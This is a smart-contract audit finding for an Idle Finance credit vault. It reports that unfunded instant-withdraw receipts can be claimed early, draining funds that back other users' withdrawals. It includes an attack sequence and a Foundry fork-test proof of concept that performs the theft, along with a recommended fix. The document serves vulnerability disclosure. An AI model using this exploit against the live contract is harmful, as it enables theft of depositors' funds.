### Title
Instant-withdraw receipts can be claimed before they are funded, draining the strategy's funded normal-withdraw liquidity - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimInstantWithdrawRequest` burns a user's instant-withdraw receipt and pays out underlying from the strategy balance without verifying that the instant request was actually funded via `collectInstantWithdrawFunds` at `startEpoch`. The only solvency guard, `_transferFundedClaim`, protects `defaultRecoveryReserve` but ignores `pendingInstantWithdraws`, so an unfunded instant receipt can spend underlying that was collected at `stopEpoch` to back already-funded normal withdraw receipts.

### Finding Description
The flow in `IdleCDOEpochVariant.requestWithdraw` (`contracts/IdleCDOEpochVariant.sol:761-769`) routes a withdrawal to `IdleCreditVault.requestInstantWithdraw` when `_isInstantWithdrawEnabled()` and the APR dropped by more than `instantWithdrawAprDelta`. That mints a receipt and increments `pendingInstantWithdraws` (`IdleCreditVault.sol:356-375`). Funding only arrives later, at `startEpoch`, via `collectInstantWithdrawFunds` (`IdleCreditVault.sol:398-403`).

`IdleCDOEpochVariant.claimInstantWithdrawRequest` (`IdleCDOEpochVariant.sol:975-979`) only checks `allowInstantWithdraw`, then forwards to `IdleCreditVault.claimInstantWithdrawRequest` (`IdleCreditVault.sol:380-393`), which burns `instantWithdrawsRequests[_user]` and calls `_transferFundedClaim(_user, amount)` immediately — no check that `pendingInstantWithdraws` was funded or that an epoch boundary passed.

`_transferFundedClaim` (`IdleCreditVault.sol:897-907`) only enforces `balance - defaultRecoveryReserve >= _amount`. Underlying held by the strategy to satisfy funded normal withdraw receipts (pulled in by `collectWithdrawFunds` at `stopEpoch`, `IdleCreditVault.sol:411-430`) is unprotected.

Attack sequence (buffer phase, fixed-APR vault with instant withdrawals enabled):
1. Manager/owner lowers APR for the next epoch (honest action), so `lastEpochApr > unscaledApr + instantWithdrawAprDelta`.
2. Borrower repayment at `stopEpoch` funds pending normal withdraw receipts; `collectWithdrawFunds` moves that underlying into the strategy, where it sits waiting for users' `claimWithdrawRequest`.
3. Attacker (any KYC-passing tranche holder) calls `requestWithdraw`, gets an instant receipt, then calls `claimInstantWithdrawRequest` in the same or next block — before `startEpoch` funds the instant queue.
4. `_transferFundedClaim` pays the attacker out of the strategy balance backing other users' funded receipts. When those users later claim, the strategy is short and their claims revert or underpay.

### Impact Explanation
Direct theft of other users' funded withdraw proceeds. The attacker extracts up to the full strategy underlying balance (bounded by their tranche position, which can be sized arbitrarily during the buffer), while honest withdrawers' claims become unpayable — a solvency break of the "one receipt one funded payout" invariant. Loss equals the attacker's instant receipt amount, up to the total pending funded-withdraw liquidity in the strategy.

### Likelihood Explanation
Requires only (a) instant withdrawals enabled (default unless `disableInstantWithdraw`), (b) an APR decrease exceeding `instantWithdrawAprDelta` — a routine manager action, and (c) funded-but-unclaimed normal withdraw liquidity sitting in the strategy, which is the normal state after any `stopEpoch` until all users claim. The attacker needs only tranche tokens and a Keyring pass; no privileged role. The entire sequence can be executed atomically around the `stopEpoch`/`startEpoch` boundary.

### Recommendation
In `claimInstantWithdrawRequest`, track funded instant liquidity separately (e.g., a `fundedInstantWithdraws` counter incremented in `collectInstantWithdrawFunds`) and revert or cap the claim when `amount > fundedInstantWithdraws - alreadyClaimed`. Alternatively, gate instant claims until `epochNumber` has advanced past the request epoch, mirroring the normal-claim gating in `_claimFundedWithdrawRequest`. `_transferFundedClaim` should also account for `pendingInstantWithdraws` when protecting segregated balances.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

/// Fork test against a live IdleCDOEpochVariant deployment (same pattern as
/// test/foundry/IdleCDOEpochQueue.t.sol, which forks mainnet @20933865).
contract InstantWithdrawPrefundingTheft is Test {
    IdleCDOEpochVariant cdo;
    IdleCreditVault strategy;
    IERC20Detailed underlying;
    address attacker = makeAddr("attacker");
    address honestWithdrawer = makeAddr("honest");

    function setUp() public {
        vm.createSelectFork("mainnet", 20933865);
        cdo = IdleCDOEpochVariant(<CDO_ADDRESS>);
        strategy = IdleCreditVault(cdo.strategy());
        underlying = IERC20Detailed(cdo.token());
    }

    function testUnfundedInstantClaimDrainsFundedReceipts() public {
        // PRECONDITIONS (reachable via honest protocol ops):
        // - stopEpoch ran; collectWithdrawFunds moved funded-receipt
        //   underlyings into `strategy` for honestWithdrawer, unclaimed.
        // - manager lowered unscaledApr for next epoch so that
        //   lastEpochApr > unscaledApr + instantWithdrawAprDelta.

        uint256 stratBal = underlying.balanceOf(address(strategy));
        assertGt(stratBal, 0); // funded normal receipts sitting in strategy

        // Attacker holds AA tranche tokens (deal/seed via deposit pre-epoch).
        uint256 trancheAmt = cdo.maxWithdrawable(attacker, cdo.AATranche());

        // 1) Buffer phase: request instant withdraw (APR dropped).
        vm.prank(attacker);
        cdo.requestWithdraw(trancheAmt, cdo.AATranche());
        assertGt(strategy.instantWithdrawsRequests(attacker), 0);
        assertGt(strategy.pendingInstantWithdraws(), 0); // still UNFUNDED

        // 2) Claim immediately — no epoch wait, no funding check.
        uint256 balPre = underlying.balanceOf(attacker);
        vm.prank(attacker);
        cdo.claimInstantWithdrawRequest();

        uint256 stolen = underlying.balanceOf(attacker) - balPre;
        assertGt(stolen, 0);
        // Attacker was paid out of strategy balance reserved for
        // honestWithdrawer's funded receipt; pendingInstantWithdraws
        // is still non-zero (never funded by borrower/startEpoch).
        assertGt(strategy.pendingInstantWithdraws(), 0);

        // 3) Honest funded claim now underflows the strategy balance.
        vm.prank(honestWithdrawer);
        vm.expectRevert(); // safeTransfer fails: balance drained
        cdo.claimWithdrawRequest();
    }
}
```
